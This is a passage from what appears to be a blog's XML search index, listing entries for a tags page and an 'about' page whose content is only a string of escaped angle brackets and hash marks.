  </entry>
  <entry>
    <title></title>
    <url>%2Ftags%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[0o0]]></title>
    <url>%2Fabout%2Findex.html</url>
    <content type="text"><![CDATA[&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&gt;######！######!&lt;&lt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&gt;&lt;&lt;&lt;&gt;&lt;&gt;&gt;&gt;&gt;&gt;]]></content>
  </entry>
</search>
